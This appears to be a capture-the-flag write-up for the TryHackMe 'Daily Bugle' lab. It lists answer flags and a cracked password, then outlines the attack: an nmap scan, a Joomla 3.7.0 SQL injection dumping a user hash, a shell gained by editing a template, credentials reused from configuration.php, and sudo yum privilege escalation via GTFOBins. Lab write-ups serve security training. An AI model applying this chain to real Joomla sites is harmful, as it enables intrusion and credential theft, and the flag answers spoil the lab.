# Daily Bugle
##### Question 1: Access the web server, who robbed the bank?
Answer
```bash
spiderman
```

##### Question 2: What is the Joomla version?
Answer
```bash
3.7.0
```

##### Question 3: What is Jonah's cracked password?
Answer
```bash
spiderman123
```

##### Question 4: User Flag
Answer
```bash
27a260fe3cba712cfdedb1c86d80442e
```

##### Question 5: Root flag
Answer
```bash
eec3d53292b1821868266858d7fa6f79
```

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Nmap Scan:
```bash
Nmap scan report for 10.10.66.214
Host is up (0.11s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   40.60 ms  10.6.0.1
2   ... 3
4   108.28 ms 10.10.66.214

```

Vulnerable to SQLi via the version
```bash
root@kali:/opt/JOOMSCAN/joomscan# python test.py HTTP://10.10.66.214
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session

```

creds from hash: jonah:spiderman123

shell from adding new page in a template and then going to that page


python -c 'import pty; pty.spawn("/bin/bash")'

configuration.php gives sql database creds which are reused for user jjameson
```bash
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
```
```bash
jjameson:nv5uz9r3ZEDzVjNu
```

Priv Esc:
```bash
sudo yum privs

GTFO Bins (b): https://gtfobins.github.io/gtfobins/yum/ 
```

